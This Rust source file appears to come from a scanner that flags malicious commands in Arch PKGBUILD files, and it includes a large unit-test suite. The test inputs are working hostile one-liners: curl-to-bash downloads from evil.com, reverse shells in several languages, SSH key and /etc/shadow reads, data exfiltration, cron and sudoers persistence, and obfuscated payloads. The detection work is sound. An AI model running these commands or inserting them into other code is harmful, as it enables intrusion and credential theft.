pub mod patterns;

use crate::features::Feature;
use crate::shared::models::PackageContext;
use crate::shared::scoring::{Signal, SignalCategory};

pub struct PkgbuildAnalysis;

impl Feature for PkgbuildAnalysis {
    fn analyze(&self, ctx: &PackageContext) -> Vec<Signal> {
        let Some(ref content) = ctx.pkgbuild_content else {
            return Vec::new();
        };

        let compiled = patterns::compiled_patterns();
        let mut signals = Vec::new();

        for pat in compiled {
            if pat.regex.is_match(content) {
                let matched_line = content
                    .lines()
                    .find(|line| pat.regex.is_match(line))
                    .map(|line| line.trim().to_string());
                signals.push(Signal {
                    id: pat.id.clone(),
                    category: SignalCategory::Pkgbuild,
                    points: pat.points,
                    description: pat.description.clone(),
                    is_override_gate: pat.override_gate,
                    matched_line,
                });
            }
        }

        signals
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn analyze(content: &str) -> Vec<String> {
        let ctx = PackageContext {
            name: "test-pkg".into(),
            metadata: None,
            pkgbuild_content: Some(content.into()),
            install_script_content: None,
            prior_pkgbuild_content: None,
            git_log: vec![],
            maintainer_packages: vec![],
        };
        PkgbuildAnalysis.analyze(&ctx).iter().map(|s| s.id.clone()).collect()
    }

    fn has(ids: &[String], id: &str) -> bool {
        ids.iter().any(|s| s == id)
    }

    // --- Download-and-execute (override gates) ---

    #[test]
    fn curl_pipe() {
        let ids = analyze("curl -s https://evil.com/x | bash");
        assert!(has(&ids, "P-CURL-PIPE"));
    }

    #[test]
    fn wget_pipe() {
        let ids = analyze("wget -q https://evil.com/x | sh");
        assert!(has(&ids, "P-WGET-PIPE"));
    }

    #[test]
    fn curl_pipe_python() {
        let ids = analyze("curl https://evil.com/x | python3");
        assert!(has(&ids, "P-CURL-PIPE-PYTHON"));
    }

    #[test]
    fn curl_pipe_perl() {
        let ids = analyze("curl https://evil.com/x | perl");
        assert!(has(&ids, "P-CURL-PIPE-PERL"));
    }

    #[test]
    fn wget_pipe_python() {
        let ids = analyze("wget https://evil.com/x | python");
        assert!(has(&ids, "P-WGET-PIPE-PYTHON"));
    }

    #[test]
    fn source_remote() {
        let ids = analyze("source <(curl https://evil.com/env.sh)");
        assert!(has(&ids, "P-SOURCE-REMOTE"));
    }

    #[test]
    fn python_exec_url() {
        let ids = analyze("exec(urlopen('https://evil.com/payload.py').read())");
        assert!(has(&ids, "P-PYTHON-EXEC-URL"));
    }

    // --- Reverse shells ---

    #[test]
    fn revshell_devtcp() {
        let ids = analyze("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1");
        assert!(has(&ids, "P-REVSHELL-DEVTCP"));
    }

    #[test]
    fn revshell_nc() {
        let ids = analyze("nc -e /bin/sh 10.0.0.1 4444");
        assert!(has(&ids, "P-REVSHELL-NC"));
    }

    #[test]
    fn revshell_ncat() {
        let ids = analyze("ncat -c /bin/bash 192.168.1.1 443");
        assert!(has(&ids, "P-REVSHELL-NC"));
    }

    #[test]
    fn revshell_nc_path_prefixed() {
        let ids = analyze("/usr/bin/nc -e /bin/sh 10.0.0.1 4444");
        assert!(has(&ids, "P-REVSHELL-NC"));
    }

    #[test]
    fn revshell_nc_megasync_no_signal() {
        let ids = analyze("git -C MEGAsync -c protocol.file.allow='always' submodule update");
        assert!(!has(&ids, "P-REVSHELL-NC"), "MEGAsync should not trigger P-REVSHELL-NC, got: {ids:?}");
    }

    #[test]
    fn revshell_nc_sync_no_signal() {
        let ids = analyze("sync -c /dev/sda");
        assert!(!has(&ids, "P-REVSHELL-NC"), "sync -c should not trigger P-REVSHELL-NC, got: {ids:?}");
    }

    #[test]
    fn revshell_nc_func_no_signal() {
        let ids = analyze("func -e test_handler");
        assert!(!has(&ids, "P-REVSHELL-NC"), "func should not trigger P-REVSHELL-NC, got: {ids:?}");
    }

    #[test]
    fn revshell_socat() {
        let ids = analyze("socat TCP:10.0.0.1:4444 EXEC:/bin/sh");
        assert!(has(&ids, "P-REVSHELL-SOCAT"));
    }

    #[test]
    fn revshell_python() {
        let ids = analyze("import socket; s=socket.socket(); s.connect(('10.0.0.1',4444)); import subprocess");
        assert!(has(&ids, "P-REVSHELL-PYTHON"));
    }

    // --- Obfuscation ---

    #[test]
    fn eval_base64() {
        let ids = analyze("eval $(echo payload | base64 -d)");
        assert!(has(&ids, "P-EVAL-BASE64"));
    }

    #[test]
    fn base64_decode() {
        let ids = analyze("echo data | base64 -d > out");
        assert!(has(&ids, "P-BASE64"));
    }

    #[test]
    fn eval_var() {
        let ids = analyze("eval \"$payload\"");
        assert!(has(&ids, "P-EVAL-VAR"));
    }

    #[test]
    fn gzip_exec() {
        let ids = analyze("zcat payload.gz | bash");
        assert!(has(&ids, "P-GZIP-EXEC"));
    }

    #[test]
    fn python_inline() {
        let ids = analyze("python3 -c 'import os; os.system(\"id\")'");
        assert!(has(&ids, "P-PYTHON-INLINE"));
    }

    #[test]
    fn python_dynamic_import() {
        let ids = analyze("__import__('os').system('id')");
        assert!(has(&ids, "P-PYTHON-DYNAMIC-IMPORT"));
    }

    #[test]
    fn python_exec_compound() {
        let ids = analyze("python3 -c \"exec(open('payload.py').read())\"");
        assert!(has(&ids, "P-PYTHON-EXEC-COMPOUND"));
    }

    // --- Credential theft ---

    #[test]
    fn ssh_access() {
        let ids = analyze("cat ~/.ssh/id_rsa");
        assert!(has(&ids, "P-SSH-ACCESS"));
    }

    #[test]
    fn browser_data() {
        let ids = analyze("cp -r ~/.config/google-chrome/ /tmp/loot");
        assert!(has(&ids, "P-BROWSER-DATA"));
    }

    #[test]
    fn gpg_access() {
        let ids = analyze("tar czf keys.tar.gz ~/.gnupg/");
        assert!(has(&ids, "P-GPG-ACCESS"));
    }

    #[test]
    fn passwd_read() {
        let ids = analyze("cat /etc/shadow");
        assert!(has(&ids, "P-PASSWD-READ"));
    }

    #[test]
    fn clipboard_read() {
        let ids = analyze("xclip -selection clipboard -o");
        assert!(has(&ids, "P-CLIPBOARD-READ"));
    }

    #[test]
    fn disk_read() {
        let ids = analyze("dd if=/dev/sda of=/tmp/dump bs=512 count=1");
        assert!(has(&ids, "P-DISK-READ"));
    }

    // --- Persistence ---

    #[test]
    fn profile_mod() {
        let ids = analyze("echo 'malware' >> ~/.bashrc");
        assert!(has(&ids, "P-PROFILE-MOD"));
    }

    #[test]
    fn systemd_create() {
        let ids = analyze("systemctl enable evil.service");
        assert!(has(&ids, "P-SYSTEMD-CREATE"));
    }

    #[test]
    fn cron_create() {
        let ids = analyze("echo '*/5 * * * * /tmp/payload' | crontab -");
        assert!(has(&ids, "P-CRON-CREATE"));
    }

    #[test]
    fn ld_preload() {
        let ids = analyze("LD_PRELOAD=/tmp/evil.so ./target");
        assert!(has(&ids, "P-LD-PRELOAD"));
    }

    #[test]
    fn nohup_background() {
        let ids = analyze("nohup /tmp/miner &");
        assert!(has(&ids, "P-NOHUP-BACKGROUND"));
    }

    // --- Privilege escalation ---

    #[test]
    fn suid_bit() {
        let ids = analyze("chmod +s /usr/bin/evil");
        assert!(has(&ids, "P-SUID-BIT"));
    }

    #[test]
    fn mkfifo() {
        let ids = analyze("mkfifo /tmp/pipe");
        assert!(has(&ids, "P-MKFIFO"));
    }

    // --- C2 / Exfiltration ---

    #[test]
    fn discord_webhook() {
        let ids = analyze("curl https://discord.com/api/webhooks/123/ABC");
        assert!(has(&ids, "P-DISCORD-WEBHOOK"));
    }

    #[test]
    fn url_shortener() {
        let ids = analyze("curl https://bit.ly/malware");
        assert!(has(&ids, "P-URL-SHORTENER"));
    }

    #[test]
    fn openssl_client() {
        let ids = analyze("openssl s_client -connect evil.com:443");
        assert!(has(&ids, "P-OPENSSL-CLIENT"));
    }

    #[test]
    fn devnull_background() {
        let ids = analyze("curl http://evil.com/beacon >/dev/null 2>&1 &");
        assert!(has(&ids, "P-DEVNULL-BACKGROUND"));
    }

    #[test]
    fn dns_exfil() {
        let ids = analyze("dig $encoded_data.attacker.com");
        assert!(has(&ids, "P-DNS-EXFIL"));
    }

    #[test]
    fn curl_post_data() {
        let ids = analyze("curl -d $secret https://evil.com/collect");
        assert!(has(&ids, "P-CURL-POST-DATA"));
    }

    // --- Crypto mining ---

    #[test]
    fn miner_binary() {
        let ids = analyze("./xmrig --config=pool.json");
        assert!(has(&ids, "P-MINER-BINARY"));
    }

    #[test]
    fn stratum_url() {
        let ids = analyze("stratum+tcp://pool.example.com:3333");
        assert!(has(&ids, "P-STRATUM-URL"));
    }

    #[test]
    fn mining_pool() {
        let ids = analyze("--pool moneroocean.stream:10001");
        assert!(has(&ids, "P-MINING-POOL"));
    }

    #[test]
    fn crypto_wallet() {
        let ids = analyze("--wallet 44AFFq5kSiGBoZ4NMDwYtN18obc8AemS33DBLWs3H7otXft3XjrpDtQGv7SqSsaBYBb98uNbr2VBBEt7f2wfn3RVGQBEP3A");
        assert!(has(&ids, "P-CRYPTO-WALLET"));
    }

    // --- Download chains ---

    #[test]
    fn chmod_exec_chain() {
        let ids = analyze("chmod +x payload && ./payload");
        assert!(has(&ids, "P-CHMOD-EXEC-CHAIN"));
    }

    #[test]
    fn wget_chmod_exec() {
        let ids = analyze("curl -o backdoor https://evil.com/bd && chmod +x backdoor");
        assert!(has(&ids, "P-WGET-CHMOD-EXEC"));
    }

    #[test]
    fn tmp_execution() {
        let ids = analyze("chmod +x /tmp/payload");
        assert!(has(&ids, "P-TMP-EXECUTION"));
    }

    #[test]
    fn archive_exec() {
        let ids = analyze("tar xf payload.tar.gz && ./setup");
        assert!(has(&ids, "P-ARCHIVE-EXEC"));
    }

    // --- Obfuscation (new) ---

    #[test]
    fn printf_hex() {
        let ids = analyze(r"printf '\x63\x75\x72\x6c\x20'");
        assert!(has(&ids, "P-PRINTF-HEX"));
    }

    #[test]
    fn xxd_decode() {
        let ids = analyze("xxd -r payload.hex > payload.bin");
        assert!(has(&ids, "P-XXD-DECODE"));
    }

    // --- Kernel modules ---

    #[test]
    fn kernel_module_load() {
        let ids = analyze("insmod evil.ko");
        assert!(has(&ids, "P-KERNEL-MODULE-LOAD"));
    }

    #[test]
    fn kernel_module_write() {
        let ids = analyze("cp evil.ko /lib/modules/$(uname -r)/");
        assert!(has(&ids, "P-KERNEL-MODULE-WRITE"));
    }

    // --- Other ---

    #[test]
    fn pastebin_code() {
        let ids = analyze("curl -s https://ptpb.pw/~x | bash");
        assert!(has(&ids, "P-PASTEBIN-CODE"));
    }

    #[test]
    fn sysinfo_recon() {
        let ids = analyze("uname -a > /tmp/info");
        assert!(has(&ids, "P-SYSINFO-RECON"));
    }

    #[test]
    fn env_token_access() {
        let ids = analyze("echo $GITHUB_TOKEN | curl -d @- https://evil.com");
        assert!(has(&ids, "P-ENV-TOKEN-ACCESS"));
    }

    // --- Shell obfuscation ---

    #[test]
    fn ifs_obfuscation() {
        let ids = analyze("echo id |${IFS}sh");
        assert!(has(&ids, "P-IFS-OBFUSCATION"));
    }

    #[test]
    fn ansi_c_hex() {
        let ids = analyze("$'\\x63\\x61\\x74' /etc/passwd");
        assert!(has(&ids, "P-ANSI-C-HEX"));
    }

    #[test]
    fn rot13() {
        let ids = analyze("echo 'phey uggc://rivy.pbz | onfu' | tr 'a-zA-Z' 'n-za-mN-ZA-M' | bash");
        assert!(has(&ids, "P-ROT13"));
    }

    #[test]
    fn octal_encode() {
        let ids = analyze("printf '\\143\\165\\162\\154'");
        assert!(has(&ids, "P-OCTAL-ENCODE"));
    }

    #[test]
    fn rev_exec() {
        let ids = analyze("echo 'hsab | moc.live//:ptth lruc' | rev | sh");
        assert!(has(&ids, "P-REV-EXEC"));
    }

    // --- Reverse shells (additional languages) ---

    #[test]
    fn revshell_perl() {
        let ids = analyze("perl -e 'use Socket;$i=\"10.0.0.1\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));exec(\"/bin/sh -i\");'");
        assert!(has(&ids, "P-REVSHELL-PERL"));
    }

    #[test]
    fn revshell_ruby() {
        let ids = analyze("ruby -rsocket -e 'f=TCPSocket.open(\"10.0.0.1\",4444).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'");
        assert!(has(&ids, "P-REVSHELL-RUBY"));
    }

    #[test]
    fn revshell_awk() {
        let ids = analyze("awk 'BEGIN {s=\"/inet/tcp/0/10.0.0.1/4444\"; while(1) { s |& getline c; print c |& \"/bin/sh\"; }}'");
        assert!(has(&ids, "P-REVSHELL-AWK"));
    }

    #[test]
    fn revshell_lua() {
        let ids = analyze("lua -e \"require('socket');s=socket.tcp();s:connect('10.0.0.1','4444');os.execute('/bin/sh -i <&3 >&3 2>&3')\"");
        assert!(has(&ids, "P-REVSHELL-LUA"));
    }

    #[test]
    fn revshell_php() {
        let ids = analyze("php -r '$s=fsockopen(\"10.0.0.1\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'");
        assert!(has(&ids, "P-REVSHELL-PHP"));
    }

    // --- Download-and-execute variants ---

    #[test]
    fn decompress_exec() {
        let ids = analyze("xzcat payload.xz | bash");
        assert!(has(&ids, "P-DECOMPRESS-EXEC"));
    }

    #[test]
    fn proc_sub_download() {
        let ids = analyze("bash <(curl -s https://evil.com/script.sh)");
        assert!(has(&ids, "P-PROC-SUB-DOWNLOAD"));
    }

    #[test]
    fn ruby_exec_url() {
        let ids = analyze("ruby -e \"eval(Net::HTTP.get(URI('https://evil.com/payload.rb')))\"");
        assert!(has(&ids, "P-RUBY-EXEC-URL"));
    }

    #[test]
    fn perl_exec_url() {
        let ids = analyze("perl -MLWP::Simple -e 'exec(get(\"https://evil.com/x\"))'");
        assert!(has(&ids, "P-PERL-EXEC-URL"));
    }

    #[test]
    fn dev_udp() {
        let ids = analyze("echo data > /dev/udp/10.0.0.1/53");
        assert!(has(&ids, "P-DEV-UDP"));
    }

    // --- Encoding bypasses ---

    #[test]
    fn base32() {
        let ids = analyze("echo MNUHK3TLNFXGK | base32 -d | bash");
        assert!(has(&ids, "P-BASE32"));
    }

    #[test]
    fn openssl_decrypt() {
        let ids = analyze("openssl enc aes-256-cbc -d -in payload.enc -out payload.sh -pass pass:key");
        assert!(has(&ids, "P-OPENSSL-DECRYPT"));
    }

    #[test]
    fn telnet_pipe() {
        let ids = analyze("telnet evil.com 4444 | bash");
        assert!(has(&ids, "P-TELNET-PIPE"));
    }

    // --- Persistence ---

    #[test]
    fn xdg_autostart() {
        let ids = analyze("cp malware.desktop ~/.config/autostart/malware.desktop");
        assert!(has(&ids, "P-XDG-AUTOSTART"));
    }

    #[test]
    fn systemd_user() {
        let ids = analyze("cp exploit.service ~/.config/systemd/user/exploit.service");
        assert!(has(&ids, "P-SYSTEMD-USER"));
    }

    #[test]
    fn udev_rule() {
        let ids = analyze("cp 99-exploit.rules /etc/udev/rules.d/99-exploit.rules");
        assert!(has(&ids, "P-UDEV-RULE"));
    }

    #[test]
    fn at_job() {
        let ids = analyze("at now + 1 minute <<< '/root/malware'");
        assert!(has(&ids, "P-AT-JOB"));
    }

    #[test]
    fn prompt_command() {
        let ids = analyze("echo 'PROMPT_COMMAND=\"curl http://evil.com\"' >> ~/.bashrc");
        assert!(has(&ids, "P-PROMPT-COMMAND"));
    }

    #[test]
    fn bash_logout() {
        let ids = analyze("echo 'curl http://evil.com' >> ~/.bash_logout");
        assert!(has(&ids, "P-BASH-LOGOUT"));
    }

    // --- Privilege escalation ---

    #[test]
    fn sudoers_mod() {
        let ids = analyze("echo 'user ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers");
        assert!(has(&ids, "P-SUDOERS-MOD"));
    }

    #[test]
    fn polkit_rule() {
        let ids = analyze("cp exploit.rules /etc/polkit-1/rules.d/49-exploit.rules");
        assert!(has(&ids, "P-POLKIT-RULE"));
    }

    #[test]
    fn setcap() {
        let ids = analyze("setcap cap_net_raw=ep /usr/bin/exploit");
        assert!(has(&ids, "P-SETCAP"));
    }

    // --- Anti-forensics ---

    #[test]
    fn history_clear() {
        let ids = analyze("unset HISTFILE");
        assert!(has(&ids, "P-HISTORY-CLEAR"));
    }

    #[test]
    fn log_clear() {
        let ids = analyze("rm -rf /var/log/auth.log");
        assert!(has(&ids, "P-LOG-CLEAR"));
    }

    // --- Other ---

    #[test]
    fn pacman_hook() {
        let ids = analyze("install -Dm644 hook.hook /usr/share/libalpm/hooks/evil.hook");
        assert!(has(&ids, "P-PACMAN-HOOK"));
    }

    #[test]
    fn dd_write() {
        let ids = analyze("dd if=payload.bin of=/dev/sda bs=512 count=1");
        assert!(has(&ids, "P-DD-WRITE"));
    }

    #[test]
    fn alias_override() {
        let ids = analyze("alias sudo='curl http://evil.com/creds | nc 10.0.0.1 4444; sudo'");
        assert!(has(&ids, "P-ALIAS-OVERRIDE"));
    }

    // --- False positive check ---

    #[test]
    fn benign_pkgbuild_no_signals() {
        let ids = analyze(r#"
pkgname=yay
pkgver=12.4.2
pkgrel=1
arch=('x86_64')
depends=('pacman' 'git')
makedepends=('go')
source=("${pkgname}-${pkgver}.tar.gz::https://github.com/Jguer/yay/archive/v${pkgver}.tar.gz")
sha256sums=('abc123def456')

build() {
    cd "$pkgname-$pkgver"
    export CGO_CPPFLAGS="${CPPFLAGS}"
    export GOFLAGS="-buildmode=pie -trimpath"
    go build
}

package() {
    install -Dm755 yay "${pkgdir}/usr/bin/yay"
}
"#);
        assert!(ids.is_empty(), "Benign PKGBUILD should trigger no signals, got: {ids:?}");
    }

    // --- SUID false positive regression ---

    #[test]
    fn suid_bit_4digit() {
        let ids = analyze("chmod 4755 /usr/bin/evil");
        assert!(has(&ids, "P-SUID-BIT"));
    }

    #[test]
    fn suid_bit_sgid() {
        let ids = analyze("chmod 2755 /usr/bin/evil");
        assert!(has(&ids, "P-SUID-BIT"));
    }

    #[test]
    fn chmod_755_no_suid() {
        let ids = analyze("chmod 755 /usr/bin/tool");
        assert!(!has(&ids, "P-SUID-BIT"), "chmod 755 should not trigger SUID, got: {ids:?}");
    }

    #[test]
    fn chmod_644_no_suid() {
        let ids = analyze("chmod 644 /usr/share/file");
        assert!(!has(&ids, "P-SUID-BIT"), "chmod 644 should not trigger SUID, got: {ids:?}");
    }

    #[test]
    fn find_chmod_755_no_suid() {
        let ids = analyze(r#"find "${pkgdir}" -type d -exec chmod 755 {} +"#);
        assert!(!has(&ids, "P-SUID-BIT"), "find chmod 755 should not trigger SUID, got: {ids:?}");
    }

    // --- Crypto wallet false positive regression ---

    #[test]
    fn crypto_wallet_sha256_no_signal() {
        let ids = analyze("'cf5438cf5dbbc10d9b17cad5655e2fb1f15d5196755ea0b3ecbee81b2c8682fe')");
        assert!(!has(&ids, "P-CRYPTO-WALLET"), "SHA256 hash should not trigger crypto wallet, got: {ids:?}");
    }
}
